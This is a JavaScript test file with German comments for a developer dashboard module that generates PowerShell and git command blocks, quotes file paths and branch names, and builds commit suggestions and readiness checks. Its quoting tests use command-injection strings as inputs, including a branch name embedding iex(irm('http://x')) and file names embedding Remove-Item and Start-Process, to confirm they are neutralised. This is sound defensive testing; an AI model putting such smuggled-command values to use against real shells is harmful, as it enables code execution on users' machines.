/**
 * Datei: public/leitstand/code-daten.test.mjs
 *
 * Zweck: F46 D4 — reine Regeln von Entwicklung › Code und „Bereit zum Start?“ (code-daten.js):
 * Gruppierung, PowerShell-Quoting, Befehlsblöcke „Sichern“ ohne Platzhalter (F-958) mit cd und getrenntem push
 * (F-959, F45 B2a-3b), Prüfstand mit cd, Commit-Vorschlag,
 * Verlaufsfilter, Commit-Freigabe und Prüfliste.
 */

import assert from 'node:assert/strict'
import { test } from 'node:test'
import { hatPlatzhalter } from './befehlsblock.js'
import { BLOCK_FUSS, BLOCK_KOPF, befehlsBlock, befehlsBloecke, bereitschaft, istBlockform, ortZeile, commitUrl, commitVorschlag, filtereVerlauf, freigabeZustand, gitPfadArgument, gruppiereNachOrdner, pruefstandBefehle, psArgument, sicherBefehle, summeZeilen, verlaufArt, zerlegeAbstand } from './code-daten.js'

const DATEIEN = [
  { pfad: 'public/leitstand/views/code.js', art: '??', xy: '??', plus: 10, minus: 0 },
  { pfad: 'public/leitstand/api.js', art: 'M', xy: ' M', plus: 3, minus: 1 },
  { pfad: 'README.md', art: 'M', xy: 'MM', plus: null, minus: null },
  { pfad: 'public/leitstand/views/alt.js', art: 'D', xy: ' D', plus: 0, minus: 5 },
  { pfad: 'neu name.txt', art: 'R', xy: 'R ', alterPfad: 'alt.txt', plus: 0, minus: 0 },
]

/** Projektpfad der Route (F45 B2a-3b; seit B2b-4a-2a Ortszeile jedes Blocks in Blockform). */
const PFAD = String.raw`C:\Users\stefa\Projekte\mein projekt`
const ORT = String.raw`Set-Location -LiteralPath 'C:\Users\stefa\Projekte\mein projekt' -ErrorAction Stop`
/** Blockform um eine Folge (F45 B2b-4a-2a). */
const block = (...folge) => ['& {', ORT, ...folge, '}']

/** Antwort der Route im Grünfall. */
function daten(zusatz = {}) {
  return { status: 'ok', absoluterPfad: PFAD, branch: { status: 'ok', name: 'feat/f46-d4-entwicklung-code', losgeloest: false }, remoteWebUrl: { status: 'ok', url: null, origin: true }, dateien: { status: 'ok', eintraege: DATEIEN, anzahl: 5, gekappt: false }, ...zusatz }
}

/**
 * Zeilen des ersten Blocks ohne Kopf, Ortszeile und Fuß (für die bestehenden Prüfungen von add/commit).
 * @param befehle - Ergebnis von sicherBefehle
 * @returns Zeilen
 */
const ersterBlock = (befehle) => befehle.bloecke[0].slice(2, -1)

test('Gruppierung nach Ordner und Summe der Zeilen', () => {
  const gruppen = gruppiereNachOrdner(DATEIEN)
  assert.deepEqual(
    gruppen.map((g) => [g.ordner, g.dateien.length]),
    [
      ['public/leitstand/views', 2],
      ['public/leitstand', 1],
      ['', 2],
    ]
  )
  assert.deepEqual(summeZeilen(DATEIEN), { plus: 13, minus: 6 })
  assert.deepEqual(gruppiereNachOrdner(undefined), [])
})

test('PowerShell-Quoting: harmlose Zeichen bleiben, alles andere in einfachen Anführungszeichen', () => {
  assert.equal(psArgument('public/leitstand/api.js'), 'public/leitstand/api.js')
  assert.equal(psArgument('neu name.txt'), "'neu name.txt'")
  assert.equal(psArgument("a&b'c.txt"), "'a&b''c.txt'")
  assert.equal(psArgument('$(Remove-Item x).txt'), "'$(Remove-Item x).txt'")
  assert.equal(psArgument('a;b'), "'a;b'")
  assert.equal(psArgument('-x'), "'-x'")
  // Prüfpass cr 1: typografische einfache Anführungszeichen beenden in PowerShell ebenfalls ein '…'.
  assert.equal(psArgument('x’;Start-Process calc;’.txt'), "'x’’;Start-Process calc;’’.txt'")
  assert.equal(psArgument('a‘b‚c‛d'), "'a‘‘b‚‚c‛‛d'")
  assert.equal(psArgument("feat/a’;iex(irm('http://x'))’"), "'feat/a’’;iex(irm(''http://x''))’’'")
  // Ein Token, das PowerShell als Zahl läse, wird gequotet.
  assert.equal(psArgument('1kb'), "'1kb'")
  assert.equal(psArgument('1e3'), "'1e3'")
  // Pfade für git add: Glob-Zeichen und führendes „-“ wörtlich.
  assert.equal(gitPfadArgument('a[1].txt'), "':(literal)a[1].txt'")
  assert.equal(gitPfadArgument('-x.txt'), "':(literal)-x.txt'")
  assert.equal(gitPfadArgument('src/a.js'), 'src/a.js')
})

test('Commit-Vorschlag aus dem Branchnamen, ohne aktive Zeichen', () => {
  assert.equal(commitVorschlag('feat/f46-d4-entwicklung-code'), 'F46 D4: entwicklung code')
  assert.equal(commitVorschlag('feat/f725-ws7a-workforce'), 'F725 WS-7a: workforce')
  assert.equal(commitVorschlag('fix/f-958-git-block'), 'f 958 git block')
  assert.equal(commitVorschlag('feat/x$(y)`z"q'), 'x(y)zq')
  assert.equal(commitVorschlag(''), null)
  assert.equal(commitVorschlag(null), null)
})

test('Sichern: echte Dateien, Vorschlag, Push — keine Platzhalter (F-958); je Block in Blockform (B2b-4a-2a), push getrennt (F-959)', () => {
  const befehle = sicherBefehle(daten())
  assert.equal(befehle.bloecke.length, 2)
  assert.ok(befehle.bloecke.every((zeilen) => zeilen[0] === '& {' && zeilen[1] === ORT && zeilen.at(-1) === '}'), 'jeder Block in Blockform mit Set-Location auf den Projektpfad')
  const zeilen = ersterBlock(befehle)
  assert.equal(zeilen.length, 2)
  // Umbenennung: nur der neue Pfad (der alte ist im Index schon entfernt, Prüfpass qa 1).
  assert.equal(zeilen[0], "git add public/leitstand/views/code.js public/leitstand/api.js README.md public/leitstand/views/alt.js 'neu name.txt'")
  assert.equal(zeilen[1], 'git commit -m "F46 D4: entwicklung code"')
  assert.deepEqual(befehle.bloecke[1], block('git push -u origin feat/f46-d4-entwicklung-code'))
  assert.deepEqual(befehle.hinweise, [])
  assert.equal(hatPlatzhalter(befehle.bloecke.flat()), false)
  const minus = sicherBefehle(daten({ dateien: { status: 'ok', eintraege: [{ pfad: '-x.txt', art: '??', xy: '??' }], anzahl: 1, gekappt: false } }))
  assert.equal(ersterBlock(minus)[0], "git add ':(literal)-x.txt'", 'führendes - wird kein Schalter')
})

test('Sichern: gestagte Löschung nicht in git add; nur gestagte Änderungen → kein git add', () => {
  const gestagt = [{ pfad: 'weg.txt', art: 'D', xy: 'D ' }, { pfad: 'b.txt', art: 'M', xy: 'M ' }]
  assert.deepEqual(ersterBlock(sicherBefehle(daten({ dateien: { status: 'ok', eintraege: gestagt, anzahl: 2, gekappt: false } })))[0], 'git add b.txt')
  const nurLoeschung = sicherBefehle(daten({ dateien: { status: 'ok', eintraege: [{ pfad: 'weg.txt', art: 'D', xy: 'D ' }], anzahl: 1, gekappt: false } }))
  assert.equal(ersterBlock(nurLoeschung)[0], 'git commit -m "F46 D4: entwicklung code"')
})

test('Sichern: viele Pfade auf mehrere Zeilen, ohne origin nur ein Block, veraltet kein Befehl', () => {
  const viele = Array.from({ length: 120 }, (_, i) => ({ pfad: `kontrollzustand/lineage-${'x'.repeat(80)}/${i}.json`, art: '??', xy: '??' }))
  const zeilen = ersterBlock(sicherBefehle(daten({ dateien: { status: 'ok', eintraege: viele, anzahl: viele.length, gekappt: false } })))
  const adds = zeilen.filter((z) => z.startsWith('git add '))
  assert.ok(adds.length >= 3)
  assert.ok(adds.every((z) => z.length <= 8100 && z.split(' ').length - 2 <= 50))
  assert.equal(adds.reduce((n, z) => n + z.split(' ').length - 2, 0), 120)
  const ohneOrigin = sicherBefehle(daten({ remoteWebUrl: { status: 'ok', url: null, origin: false } }))
  assert.equal(ohneOrigin.bloecke.length, 1)
  assert.ok(!ohneOrigin.bloecke.flat().some((z) => z.startsWith('git push')))
  assert.deepEqual(ohneOrigin.hinweise, ['keinOrigin'])
  assert.deepEqual(sicherBefehle(daten(), { veraltet: true }), { grund: 'veraltet' })
})

test('F45 B2a-3b: ohne absoluten Pfad Grund statt Befehl, Prüfstand in Blockform; Quoting der Ortszeile (cdZeile entfiel mit B2b-4b)', () => {
  assert.equal(ortZeile('/home/u/a'), "Set-Location -LiteralPath '/home/u/a' -ErrorAction Stop")
  assert.equal(ortZeile('C:\\x\\a`b'), "Set-Location -LiteralPath 'C:\\x\\a`b' -ErrorAction Stop")
  assert.equal(ortZeile(String.raw`C:\x\it's`), String.raw`Set-Location -LiteralPath 'C:\x\it''s' -ErrorAction Stop`)
  for (const pfad of [undefined, null, '', 'relativ/ordner', '.']) assert.deepEqual(sicherBefehle(daten({ absoluterPfad: pfad })), { grund: 'keinPfad' }, String(pfad))
  const unc = String.raw`Set-Location -LiteralPath '\\server\freigabe' -ErrorAction Stop`
  assert.deepEqual(befehlsBloecke(String.raw`\\server\freigabe`, [['a'], [], ['b']]).bloecke, [
    ['& {', unc, 'a', '}'],
    ['& {', unc, 'b', '}'],
  ])
  const vorlage = { status: 'ok', pruefbefehl: 'npm run check' }
  assert.deepEqual(pruefstandBefehle({ absoluterPfad: PFAD, startvorlage: vorlage }), { bloecke: [block('npm run check')] })
  assert.deepEqual(pruefstandBefehle({ absoluterPfad: 'x', startvorlage: vorlage }), { grund: 'keinPfad' })
  assert.deepEqual(pruefstandBefehle({ absoluterPfad: PFAD, startvorlage: { status: 'ok', pruefbefehl: '  ' } }), { grund: 'keinBefehl' })
  assert.deepEqual(pruefstandBefehle(null), { grund: 'keinBefehl' })
})

test('F45 B2b-4a-2a: Blockform — ortZeile immer -LiteralPath mit -ErrorAction Stop, befehlsBlock ohne Einzug, reiner Orts-Block, istBlockform', () => {
  assert.equal(ortZeile(String.raw`C:\Projekte\a`), String.raw`Set-Location -LiteralPath 'C:\Projekte\a' -ErrorAction Stop`)
  assert.equal(ortZeile(String.raw`C:\Projekte\a[1]`), String.raw`Set-Location -LiteralPath 'C:\Projekte\a[1]' -ErrorAction Stop`)
  assert.equal(ortZeile(String.raw`C:\x\it’s`), String.raw`Set-Location -LiteralPath 'C:\x\it’’s' -ErrorAction Stop`)
  assert.equal(ortZeile('/home/u/a b'), "Set-Location -LiteralPath '/home/u/a b' -ErrorAction Stop")
  // Backtick und $ sind in einfachen Anführungszeichen wörtlich (in echter PowerShell: Gate b2b4a2a (b)).
  assert.equal(ortZeile('C:\\x\\back`tick $x'), "Set-Location -LiteralPath 'C:\\x\\back`tick $x' -ErrorAction Stop")
  assert.deepEqual(befehlsBlock(PFAD, ['git status']), block('git status'))
  assert.deepEqual(befehlsBlock(PFAD, []), ['& {', ORT, '}'], 'reiner Orts-Block')
  for (const pfad of [undefined, null, '', 'relativ/ordner', '.']) assert.equal(befehlsBlock(pfad, ['x']), null, String(pfad))
  assert.ok(befehlsBlock(PFAD, ['git status']).every((zeile) => zeile === zeile.trimStart()), 'kein Einzug')
  assert.equal(istBlockform(block('git status')), true)
  assert.equal(istBlockform([' & { ', 'x', ' } ']), true, 'getrimmt')
  assert.equal(istBlockform(['git status', '}']), false)
  assert.equal(istBlockform(['& {']), false)
  assert.equal(istBlockform(undefined), false)
  assert.equal(BLOCK_KOPF, '& {')
  assert.equal(BLOCK_FUSS, '}')
})

test('Sichern: Gründe statt halber Befehle', () => {
  assert.deepEqual(sicherBefehle(daten({ dateien: { status: 'ok', eintraege: [], anzahl: 0, gekappt: false } })), { grund: 'keineAenderungen' })
  assert.deepEqual(sicherBefehle(daten({ dateien: { status: 'ok', eintraege: DATEIEN, anzahl: 900, gekappt: true } })), { grund: 'gekappt' })
  assert.deepEqual(sicherBefehle(daten({ dateien: { status: 'fehler', grund: 'x' } })), { grund: 'dateienFehler' })
  assert.deepEqual(sicherBefehle(daten({ branch: { status: 'ok', name: null, losgeloest: true, commit: 'abc1234' } })), { grund: 'keinBranch' })
  assert.deepEqual(sicherBefehle(daten({ branch: { status: 'fehler', grund: 'x' } })), { grund: 'branchFehler' })
  assert.deepEqual(sicherBefehle(daten({ branch: { status: 'ok', name: 'main', losgeloest: false } })), { grund: 'aufMain' })
  assert.deepEqual(sicherBefehle(undefined), { grund: 'dateienFehler' })
})

test('Verlauf: Art, Filter, Abstand, Commit-Link', () => {
  const v = [
    { betreff: 'F46 D3: Eintrag (#312)', zuordnung: { feature: 'F46', ws: 'D3', pr: 312 } },
    { betreff: 'Fix F-986: Chat (#299)', zuordnung: { feature: null, ws: null, pr: 299 } },
    { betreff: 'F44 Fixpaket: Nachlauf (#290)', zuordnung: { feature: 'F44', ws: null, pr: 290 } },
    { betreff: 'Doku: Lagebild (#280)', zuordnung: { feature: null, ws: null, pr: 280 } },
    { betreff: 'Merge branch x', zuordnung: { feature: null, ws: null, pr: null } },
  ]
  assert.deepEqual(v.map(verlaufArt), ['feature', 'fix', 'fix', 'doku', 'sonstiges'])
  assert.equal(filtereVerlauf(v, 'alle').length, 5)
  assert.equal(filtereVerlauf(v, 'feature').length, 1)
  assert.equal(filtereVerlauf(v, 'fix').length, 2)
  assert.equal(filtereVerlauf(v, 'doku').length, 1)
  assert.deepEqual(zerlegeAbstand(73), { stunden: 1, minuten: 13 })
  assert.equal(zerlegeAbstand(null), null)
  assert.equal(zerlegeAbstand(-5), null)
  assert.equal(commitUrl('https://github.com/o/r', 'a48b344'), 'https://github.com/o/r/commit/a48b344')
  assert.equal(commitUrl('https://github.com/o/r', 'a48b344"><x'), null)
  assert.equal(commitUrl(null, 'a48b344'), null)
})

test('Commit-Freigabe: gültig unter 10 Minuten, sonst abgelaufen', () => {
  assert.deepEqual(freigabeZustand({ status: 'ok', vorhanden: false, alterMinuten: null }), { art: 'keine' })
  assert.deepEqual(freigabeZustand({ status: 'ok', vorhanden: true, alterMinuten: 3 }), { art: 'gueltig', restMinuten: 7, alterMinuten: 3 })
  assert.deepEqual(freigabeZustand({ status: 'ok', vorhanden: true, alterMinuten: 10 }), { art: 'abgelaufen', alterMinuten: 10 })
  assert.deepEqual(freigabeZustand({ status: 'fehler', grund: 'x' }), { art: 'fehler' })
  assert.deepEqual(freigabeZustand(undefined), { art: 'unbekannt' })
  // Die seit dem Laden vergangene Zeit zählt mit (Prüfpass qa 6).
  assert.deepEqual(freigabeZustand({ status: 'ok', vorhanden: true, alterMinuten: 3 }, 8.5), { art: 'abgelaufen', alterMinuten: 11 })
})

test('Bereit zum Start: Pflichtzeilen, Hinweis main, Ladezustand', () => {
  const route = { status: 'ok', absoluterPfad: 'C:\\x', arbeitsverzeichnis: { status: 'ok', vorhanden: true }, branch: { status: 'ok', name: 'feat/x', losgeloest: false }, dateien: { status: 'ok', eintraege: [], anzahl: 0 }, harness: { status: 'ok', claudeMd: true }, startvorlage: { status: 'ok', pruefbefehl: 'npm run check' } }
  const bereit = bereitschaft({ titel: 'T', ergebnis: 'E', kontext: '', aktiverLauf: { aktiv: false }, codeStand: { zustand: 'ok', daten: route } })
  assert.equal(bereit.bereit, true)
  assert.equal(bereit.mainWarnung, false)
  assert.equal(bereit.zeilen.find((z) => z.id === 'kontext').zustand, 'offen')
  assert.equal(bereit.zeilen.find((z) => z.id === 'projektkarte').zustand, 'kommt')

  const leer = bereitschaft({ titel: ' ', ergebnis: '', aktiverLauf: { aktiv: true }, codeStand: { zustand: 'ok', daten: route } })
  assert.equal(leer.bereit, false)
  assert.equal(leer.zeilen.find((z) => z.id === 'lauf').zustand, 'warnung')
  // Ordner fehlt bzw. ohne Git: nicht bereit.
  assert.equal(bereitschaft({ titel: 'T', ergebnis: 'E', aktiverLauf: { aktiv: false }, codeStand: { zustand: 'ok', daten: { ...route, arbeitsverzeichnis: { status: 'ok', vorhanden: false } } } }).zeilen.find((z) => z.id === 'arbeitsverzeichnis').zustand, 'fehler')
  const ohneGit = bereitschaft({ titel: 'T', ergebnis: 'E', aktiverLauf: { aktiv: false }, codeStand: { zustand: 'ok', daten: { ...route, status: 'nicht_verfuegbar' } } })
  assert.equal(ohneGit.zeilen.find((z) => z.id === 'arbeitsverzeichnis').zustand, 'warnung')
  assert.equal(ohneGit.bereit, false)

  const main = bereitschaft({ titel: 'T', ergebnis: 'E', aktiverLauf: { aktiv: false }, codeStand: { zustand: 'ok', daten: { ...route, branch: { status: 'ok', name: 'main', losgeloest: false } } } })
  assert.equal(main.mainWarnung, true)
  assert.equal(main.zeilen.find((z) => z.id === 'git').zustand, 'warnung')

  const laedt = bereitschaft({ titel: 'T', ergebnis: 'E', aktiverLauf: undefined, codeStand: { zustand: 'laedt', daten: null } })
  assert.equal(laedt.zeilen.find((z) => z.id === 'git').zustand, 'laedt')
  assert.equal(laedt.zeilen.find((z) => z.id === 'lauf').zustand, 'laedt')
  assert.equal(laedt.bereit, false)

  const fehler = bereitschaft({ titel: 'T', ergebnis: 'E', aktiverLauf: { aktiv: false }, codeStand: { zustand: 'fehler', daten: null } })
  assert.equal(fehler.zeilen.find((z) => z.id === 'arbeitsverzeichnis').zustand, 'fehler')
})
